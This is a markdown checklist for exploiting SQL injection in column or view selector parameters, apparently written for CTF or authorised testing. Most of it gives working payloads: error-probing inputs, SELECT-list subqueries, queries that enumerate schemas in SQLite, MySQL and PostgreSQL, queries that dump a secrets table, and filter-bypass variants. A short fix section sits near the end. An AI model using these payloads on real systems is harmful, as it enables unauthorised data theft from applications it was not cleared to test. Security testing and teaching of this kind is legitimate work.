# Column Picker SQLi Recon Checklist

## Goal

Determine whether a configurable column/view parameter is interpolated into the SQL SELECT list and exfiltrate hidden tables through expression-context injection.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Hidden table hint (if any):
```

## 2. Map The View Selector Surface

Find inputs that control displayed columns:

- preset `<select>` views
- custom column expression text boxes
- `view`, `fields`, `columns`, `select`, `projection` API params
- report builder column pickers

Record:

```text
Endpoint:
Parameter:
Normal allowed values:
Custom expression supported: yes/no
Response format:
```

## 3. Confirm Baseline Behavior

```bash
curl -sS "https://[host]/api/items?view=name,%20price"
```

Record:

```text
Normal columns returned:
Row count:
Errors on bad preset:
```

## 4. Learn Query Shape From Errors

Test:

```text
name'
name)
name,
1
```

Look for fragments such as:

```text
FROM items ORDER BY id
SELECT id, ...
near "...": syntax error
```

Record:

```text
Error text:
Inferred injection context:
DBMS clue:
```

## 5. Test SELECT-List Subquery

Try:

```sql
name, (SELECT 1) as x
name, (SELECT version()) as v
name, (SELECT sqlite_version()) as v
```

Record:

```text
Subquery accepted: yes/no
New column name:
Value repeated per row: yes/no
```

## 6. Enumerate Hidden Schema

SQLite:

```sql
name, (SELECT group_concat(name) FROM sqlite_master WHERE type='table') as t
name, (SELECT sql FROM sqlite_master WHERE name='secrets') as ddl
```

MySQL:

```sql
name, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) as t
```

PostgreSQL:

```sql
name, (SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public') as t
```

Record:

```text
Hidden tables found:
Likely flag table:
Interesting columns:
```

## 7. Exfiltrate Target Data

Start with read-only scalar subqueries:

```sql
name, (SELECT value FROM secrets WHERE label='flag') as flag
name, (SELECT group_concat(label||'='||value, ' | ') FROM secrets) as dump
```

Record:

```text
Working exfil column:
Data type disclosed:
Flag/sensitive value redacted summary:
```

## 8. Test Allowlist Bypass Variants

If direct table injection fails, try:

```text
name, (SELECT ...) as x
name, price, (SELECT ...) as x
CASE WHEN 1=1 THEN name ELSE name END, (SELECT ...) as x
```

Also note rejected payloads:

```text
FROM secrets
audit.flags
UNION SELECT
```

Record:

```text
Blocked pattern:
Working bypass:
Why bypass works:
```

## 9. Confirm Root Cause

Separate UI intent from server behavior:

```text
UI suggests choosing inventory columns.
Confirmed bug is concatenating arbitrary expressions into the SELECT list.
```

## 10. Fix Checklist

- Replace expression input with fixed column allowlist.
- Use parameterized query builders.
- Restrict DB permissions for app accounts.
- Remove sensitive tables from the same connection if possible.
- Add regression tests for subqueries and commas in view params.

## 11. Decision Checklist

- [ ] View/column parameter identified.
- [ ] Baseline response confirmed.
- [ ] Error-based query shape inferred.
- [ ] `(SELECT 1)` subquery tested.
- [ ] Hidden schema enumerated.
- [ ] Target table/value exfiltrated.
- [ ] Root cause documented as SELECT-list injection.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
